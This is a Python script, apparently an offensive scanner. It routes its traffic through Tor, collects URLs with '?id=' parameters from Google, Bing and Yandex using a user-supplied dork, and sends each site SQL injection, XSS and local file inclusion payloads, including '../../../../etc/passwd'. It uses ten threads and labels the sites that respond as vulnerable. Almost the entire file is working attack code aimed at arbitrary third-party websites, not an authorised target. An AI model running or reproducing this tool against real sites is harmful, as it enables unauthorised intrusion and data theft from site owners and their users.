import requests
import threading
import socks
import socket
from queue import Queue
from googlesearch import search

def set_tor_proxy():
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket

def search_google_dork(dork):
    try:
        results = [result.url for result in search(dork, advanced=True, num_results=50)]
        return results
    except Exception as e:
        print(f"Google Search Error: {e}")
        return []

def search_bing_dork(dork):
    url = f"https://www.bing.com/search?q={dork}"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.get(url, headers=headers, timeout=10)
        return extract_urls(response.text)
    except Exception as e:
        print(f"Bing Search Error: {e}")
        return []

def search_yandex_dork(dork):
    url = f"https://yandex.com/search/?text={dork}"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.get(url, headers=headers, timeout=10)
        return extract_urls(response.text)
    except Exception as e:
        print(f"Yandex Search Error: {e}")
        return []

def extract_urls(html):
    return [url for url in html.split() if url.startswith("http")]

def get_dork_results(dork):
    google_results = search_google_dork(dork)
    bing_results = search_bing_dork(dork)
    yandex_results = search_yandex_dork(dork)
    
    all_results = set(google_results + bing_results + yandex_results)
    
    # Filter only URLs containing parameters like ?id=
    filtered_results = [url for url in all_results if "?id=" in url and not any(domain in url for domain in ["stackoverflow.com", "php.net", "github.com"])]
    return filtered_results

def test_vulnerabilities(url):
    sql_payloads = {"'": "Single Quote", "' OR 1=1 --": "OR 1=1", "' OR '1'='1": "OR '1'='1"}
    xss_payloads = {"<script>alert('XSS')</script>": "Basic XSS", "\"><img src=x onerror=alert('XSS')>": "Image XSS"}
    lfi_payloads = {"../../../../etc/passwd": "LFI /etc/passwd", "..\\..\\..\\..\\windows\\win.ini": "LFI Windows"}
    
    vulnerabilities = []
    
    # Test SQL Injection
    for payload, description in sql_payloads.items():
        test_url = url + payload
        try:
            response = requests.get(test_url, timeout=5)
            if any(error in response.text for error in ["SQL syntax", "mysql_fetch", "You have an error in your SQL syntax"]):
                vulnerabilities.append(("SQL Injection", description))
                break
        except requests.exceptions.RequestException:
            continue
    
    # Test XSS
    for payload, description in xss_payloads.items():
        test_url = url + payload
        try:
            response = requests.get(test_url, timeout=5)
            if payload in response.text:
                vulnerabilities.append(("XSS", description))
                break
        except requests.exceptions.RequestException:
            continue
    
    # Test LFI
    for payload, description in lfi_payloads.items():
        test_url = url + payload
        try:
            response = requests.get(test_url, timeout=5)
            if "root:x:" in response.text or "for 16-bit app support" in response.text:
                vulnerabilities.append(("LFI", description))
                break
        except requests.exceptions.RequestException:
            continue
    
    return vulnerabilities

def worker(queue):
    while not queue.empty():
        url = queue.get()
        vulnerabilities = test_vulnerabilities(url)
        if vulnerabilities:
            print(f"[VULNERABLE] {url}")
            for vuln_type, payload_used in vulnerabilities:
                print(f"    - {vuln_type} (Payload: {payload_used})")
        else:
            print(f"[SAFE] {url}")
        queue.task_done()

def main():
    set_tor_proxy()
    dork = input("Enter Google Dork: ")
    urls = get_dork_results(dork)
    
    print(f"Found {len(urls)} relevant URLs. Testing for vulnerabilities...")
    
    queue = Queue()
    for url in urls:
        queue.put(url)
    
    threads = []
    for _ in range(10):  # 10 threads for faster scanning
        t = threading.Thread(target=worker, args=(queue,))
        t.start()
        threads.append(t)
    
    queue.join()
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
